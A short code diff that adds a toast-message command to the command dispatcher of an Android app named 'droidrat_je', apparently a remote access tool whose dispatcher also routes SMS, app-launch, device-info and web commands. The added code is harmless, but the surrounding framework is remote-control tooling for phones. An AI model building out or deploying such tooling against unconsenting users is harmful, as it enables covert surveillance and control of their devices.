@@ -19,6 +19,7 @@ import com.je_chen.droidrat_je.command.PlayCommand;
 import com.je_chen.droidrat_je.command.RunAppCommand;
 import com.je_chen.droidrat_je.command.SMSCommand;
 import com.je_chen.droidrat_je.command.SensorCommand;
+import com.je_chen.droidrat_je.command.ToastCommand;
 import com.je_chen.droidrat_je.command.VibratorCommand;
 import com.je_chen.droidrat_je.command.WebCommand;
 
@@ -53,6 +54,8 @@ public class CommandProcess {
 
     private SMSCommand smsCommand;
 
+    private ToastCommand toastCommand;
+
     private VibratorCommand vibratorCommand;
 
     private WebCommand webCommand;
@@ -77,6 +80,7 @@ public class CommandProcess {
         this.infoCommand = new InfoCommand(packageManager, context);
         this.runAppCommand = new RunAppCommand(packageManager);
         this.sensorCommand = new SensorCommand(sensorManager);
+        this.toastCommand = new ToastCommand(context);
         this.vibratorCommand = new VibratorCommand(context);
         this.webCommand = new WebCommand(context);
 
@@ -153,6 +157,12 @@ public class CommandProcess {
             case "SMS":
                 Log.d(TAG, "SMS");
                 this.commandFather = smsCommand;
+                this.commandFather.processCommand(command);
+                break;
+
+            case "Toast":
+                Log.d(TAG, "Toast");
+                this.commandFather = toastCommand;
                 this.commandFather.processCommand(command);
                 break;
 
